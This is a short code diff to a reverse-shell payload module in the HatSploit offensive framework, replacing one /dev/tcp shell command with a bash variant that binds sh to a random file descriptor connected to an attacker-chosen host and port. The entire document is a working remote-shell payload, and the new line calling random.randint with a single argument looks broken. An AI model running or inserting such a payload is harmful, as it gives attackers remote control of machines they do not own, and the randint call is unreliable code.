@@ -5,6 +5,8 @@
 # Current source: https://github.com/EntySec/HatSploit
 #
 
+import random
+
 from hatsploit.lib.payload import Payload
 from hatsploit.utils.tcp import TCPClient
 
@@ -45,5 +47,7 @@ class HatSploitPayload(Payload):
     def run(self):
         connback_host, connback_port = self.parse_options(self.options)
 
-        payload = f"/bin/sh &>/dev/tcp/{connback_host}/{connback_port} 0>&1 &"
+        fd = random.randint(200)
+        payload = f"bash -c '0<&{fd}-;exec {fd}<>/dev/tcp/{connback_host}/{connback_port};sh <&{fd} >&{fd} 2>&{fd}' &"
+
         return payload
